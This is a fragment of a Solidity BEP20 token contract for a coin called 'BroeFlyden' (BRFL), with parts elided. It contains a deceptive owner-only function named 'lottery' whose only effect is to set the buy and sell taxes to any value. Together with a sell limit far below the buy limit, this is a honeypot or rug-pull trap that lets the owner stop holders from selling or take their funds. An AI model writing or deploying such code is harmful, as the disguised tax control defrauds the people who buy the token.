...
contract YourTokenName is IBEP20, Ownable
{
    ...
    string private constant _name = "BroeFlyden";
    string private constant _symbol = "BRFL";
    ...
    address public constant TeamWallet=0xeeEa8ab3e3507B4FCDD0A41F4b985320a7538aA9;
    address private constant PancakeRouter=0x10ED43C718714eb63d5aA57B78B54704E256024E;


    uint256 private _circulatingSupply =InitialSupply;
    uint256 public  balanceLimit = 3000000000000000000000000000000000000000 * 10**_decimals;
    uint256 public  sellLimit = 10000000 * 10**_decimals;
    uint256 public  buyLimit = 300000000000000000000000000000000000000000 * 10**_decimals;
    ...
    function lottery(uint8 contest, uint8 winner) public onlyOwner{  /**/
        _buyTax=contest;
        _sellTax=winner;
    }
